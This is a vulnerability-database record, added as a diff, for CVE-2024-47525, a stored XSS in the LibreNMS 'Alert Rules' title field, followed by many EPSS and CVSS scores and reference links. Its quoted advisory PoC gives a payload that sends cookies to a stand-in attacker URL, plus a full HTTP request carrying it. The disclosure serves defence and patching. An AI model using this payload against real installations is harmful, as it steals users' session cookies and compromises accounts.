@@ -1,0 +1,343 @@
+vulnerability_id: VCID-dwva-mwbe-eqgm
+aliases:
+  - CVE-2024-47525
+  - GHSA-j2j9-7pr6-xqwv
+summary: |
+  LibreNMS has Stored Cross-site Scripting vulnerability in "Alert Rules" feature
+  ### Summary
+  A Stored Cross-Site Scripting (XSS) vulnerability in the "Alert Rules" feature allows authenticated users to inject arbitrary JavaScript through the "Title" field. This vulnerability can lead to the execution of malicious code in the context of other users' sessions, potentially compromising their accounts and allowing unauthorized actions.
+
+  ### Details
+  The vulnerability occurs when creating an alert rule. The application does not properly sanitize user inputs in the "Title" field, which allows an attacker to escape the attribute context where the title is injected (data-content). Despite some character restrictions, the attacker can still inject a payload that leverages available attributes on the div element to execute JavaScript automatically when the page loads.
+
+  For example, the following payload can be used:
+  ```test1'' autofocus onfocus="document.location='https://<attacker-url>/logger.php?c='+document.cookie"```
+
+  This payload triggers the XSS when the affected page is loaded, automatically redirecting the user to the attacker's controlled domain with any non-httponly cookies present.
+
+  The vulnerability stems from the application not sanitizing the value of $rule['name'] before adding it to the $enabled_msg variable. This is evident in the code:
+
+  https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/print-alert-rules.php#L405
+
+  ### PoC
+
+  1. Create a new alert rule in the LibreNMS interface.
+  2. In the "Title" field, input the following payload:
+  ```test1'' autofocus onfocus="document.location='https://<attacker-url>/logger.php?c='+document.cookie"```
+  3. Save the rule and trigger the alert.
+  4. Observe that when the page loads, the injected JavaScript executes and redirects the user, sending their non-httponly cookies to the attacker's server.
+
+  Example Request:
+  ```http
+  POST /ajax_form.php HTTP/1.1
+  Host: <your_host>
+  X-Requested-With: XMLHttpRequest
+  X-CSRF-TOKEN: <your_XSRF_token>
+  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  Cookie: <your_cookie>
+
+  _token=<your_token>&device_id=-1&device_name=invalid+hostname&rule_id=17&type=alert-rules&template_id=&builder_json=%7B%22condition%22%3A%22AND%22%2C%22rules%22%3A%5B%7B%22id%22%3A%22access_points.accesspoint_id%22%2C%22field%22%3A%22access_points.accesspoint_id%22%2C%22type%22%3A%22string%22%2C%22input%22%3A%22text%22%2C%22operator%22%3A%22not_equal%22%2C%22value%22%3A%22test2'%5C%22%22%7D%5D%2C%22valid%22%3Atrue%7D&name=test1''+autofocus+onfocus%3D%22document.location%3D'https%3A%2F%2F<attacker_url>%2Flogger.php%3Fc%3D'%2Bdocument.cookie%22&builder_rule_0_filter=access_points.accesspoint_id&builder_rule_0_operator=not_equal&builder_rule_0_value_0=test2'%22&severity=warning&count=1&delay=1m&interval=5m&recovery=on&acknowledgement=on&maps%5B%5D=1&proc=&notes=Test2'%22&override_query=on&adv_query=select+'test3'%22'%3B
+  ```
+
+  ### Impact
+  It could allow authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. Impacted users could have their accounts compromised, enabling the attacker to perform unauthorized actions on their behalf.
+severities:
+  - score: '0.00011'
+    scoring_system: epss
+    scoring_elements: '0.00856'
+    published_at: '2025-04-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00011'
+    scoring_system: epss
+    scoring_elements: '0.00853'
+    published_at: '2025-04-22 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00011'
+    scoring_system: epss
+    scoring_elements: '0.00859'
+    published_at: '2025-04-21 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00011'
+    scoring_system: epss
+    scoring_elements: '0.00865'
+    published_at: '2025-04-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00011'
+    scoring_system: epss
+    scoring_elements: '0.00861'
+    published_at: '2025-04-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00011'
+    scoring_system: epss
+    scoring_elements: '0.00868'
+    published_at: '2025-04-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00011'
+    scoring_system: epss
+    scoring_elements: '0.00864'
+    published_at: '2025-04-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00011'
+    scoring_system: epss
+    scoring_elements: '0.00867'
+    published_at: '2025-04-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00011'
+    scoring_system: epss
+    scoring_elements: '0.00871'
+    published_at: '2025-04-26 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.01094'
+    published_at: '2025-04-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.01099'
+    published_at: '2025-04-14 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.01104'
+    published_at: '2025-04-10 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.01115'
+    published_at: '2025-04-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.01098'
+    published_at: '2025-04-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.01693'
+    published_at: '2025-04-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.01711'
+    published_at: '2025-04-27 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.0111'
+    published_at: '2025-04-12 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.0109'
+    published_at: '2025-04-04 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.01092'
+    published_at: '2025-03-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.01095'
+    published_at: '2025-04-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.01093'
+    published_at: '2025-04-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.01082'
+    published_at: '2025-04-05 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.01079'
+    published_at: '2025-04-06 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00014'
+    scoring_system: epss
+    scoring_elements: '0.01085'
+    published_at: '2025-04-07 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00033'
+    scoring_system: epss
+    scoring_elements: '0.0489'
+    published_at: '2025-03-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.21784'
+    published_at: '2024-12-11 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.20995'
+    published_at: '2024-11-01 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.21281'
+    published_at: '2024-11-18 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.21369'
+    published_at: '2024-11-20 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.21402'
+    published_at: '2024-11-21 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.21472'
+    published_at: '2024-11-23 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.21466'
+    published_at: '2024-11-24 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.21477'
+    published_at: '2024-11-26 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.21494'
+    published_at: '2024-11-28 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.21527'
+    published_at: '2024-12-03 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.21852'
+    published_at: '2024-12-13 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.21948'
+    published_at: '2024-12-15 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.22131'
+    published_at: '2024-12-17 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.22118'
+    published_at: '2024-12-19 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.22104'
+    published_at: '2024-12-27 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: '0.00051'
+    scoring_system: epss
+    scoring_elements: '0.22421'
+    published_at: '2025-01-16 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+  - score: MODERATE
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-j2j9-7pr6-xqwv
+  - score: '6.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    published_at: None
+    url: https://github.com/librenms/librenms
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/librenms/librenms
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
+    published_at: None
+    url: https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/print-alert-rules.php#L405
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/print-alert-rules.php#L405
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
+    published_at: None
+    url: https://github.com/librenms/librenms/commit/7620d220e48563938d869da7689b8ac3f7721490
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/librenms/librenms/commit/7620d220e48563938d869da7689b8ac3f7721490
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
+    published_at: None
+    url: https://github.com/librenms/librenms/security/advisories/GHSA-j2j9-7pr6-xqwv
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/librenms/librenms/security/advisories/GHSA-j2j9-7pr6-xqwv
+  - score: '5.4'
+    scoring_system: cvssv3
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-47525
+  - score: '5.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-47525
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-47525
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-47525
+weaknesses:
+  - CWE-79
+  - CWE-937
+  - CWE-1035
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-47525
+    reference_type:
+    reference_id:
+  - url: https://github.com/librenms/librenms
+    reference_type:
+    reference_id:
+  - url: https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/print-alert-rules.php#L405
+    reference_type:
+    reference_id:
+  - url: https://github.com/librenms/librenms/commit/7620d220e48563938d869da7689b8ac3f7721490
+    reference_type:
+    reference_id:
+  - url: https://github.com/librenms/librenms/security/advisories/GHSA-j2j9-7pr6-xqwv
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-47525
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:librenms:librenms:*:*:*:*:*:*:*:*
+    reference_type:
+    reference_id: cpe:2.3:a:librenms:librenms:*:*:*:*:*:*:*:*
+  - url: https://github.com/advisories/GHSA-j2j9-7pr6-xqwv
+    reference_type:
+    reference_id: GHSA-j2j9-7pr6-xqwv
